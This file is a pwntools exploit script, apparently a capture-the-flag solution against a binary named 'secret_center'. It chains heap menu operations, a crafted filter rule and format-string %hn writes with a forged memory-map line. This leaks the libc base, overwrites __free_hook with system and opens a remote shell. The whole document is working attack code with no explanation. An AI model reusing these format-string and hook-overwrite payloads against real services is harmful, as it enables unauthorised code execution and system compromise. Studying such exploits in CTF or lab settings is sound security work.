from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def fmtstr2(addr, data, written):
	cnt = 0
	datalen = len(data)
	payload = ''
	address = ''
	for i in range(0,datalen/2):
		cur = u16(data[2*i:2*i+2])
		if cur >= written&0xffff:
			to_add = cur - (written&0xffff)
		else:
			to_add = 0x10000 + cur - (written&0xffff)
		round = ''
		if to_add != 0:
			round += "%{}c".format(to_add)
		round += "%hn"
		assert(len(round) <= 0x10)
		written += to_add + 0x10 - len(round)
		payload += round.ljust(0x10, '_')
		address += p64(addr+i*2)*2
		cnt += 1
	
	return payload + address

def cmd(c):
	p.recvuntil(">")
	p.sendline(str(c))

def input_secret(sz,content):
	cmd(2)
	p.recvuntil("Size: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)

def dele():
	cmd(3)
	
def edit(sz,content):
	cmd(6)
	p.recvuntil("size: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)

def guard_ready():
	cmd(4)
	
def set_guard():
	cmd(5)

def main(host,port=20508):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./secret_center")
		# debug(0x000000000000F48)
		# gdb.attach(p)
	rule = open("./rule","rb").read()
	input_secret(0xf0,"\x00")
	dele()
	guard_ready()
	edit(len(rule),rule)
	set_guard()
	payload = ("%c"*24+"%232c"+"%hhn").ljust(0xa0,"\x00")+'\x10'
	input_secret(0xf0,payload)
	p.recvuntil("Not Good Secret :P\n\n")
	p.sendline("000000000000-7fffffffffff r--p 00000000 00:00 0    /fakemap\x00")
	input_secret(0xf0,"AAAAA\x00")
	p.recvuntil("[heap]\n")
	libc.address = int(p.recvuntil('-',drop=True),16)
	info("libc : " + hex(libc.address))
	
	payload = "/bin/sh;aa"+"%c"*15+ fmtstr2(libc.symbols["__free_hook"],p64(libc.symbols["system"])[:6],25)
	
	input_secret(0xf0,payload)
	# p.recvuntil("Not Good Secret :P\n\n")
	sleep(3)
	p.sendline("000000000000-7fffffffffff r--p 00000000 00:00 0    /fakemap\x00")
	dele()
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	main(args["REMOTE"])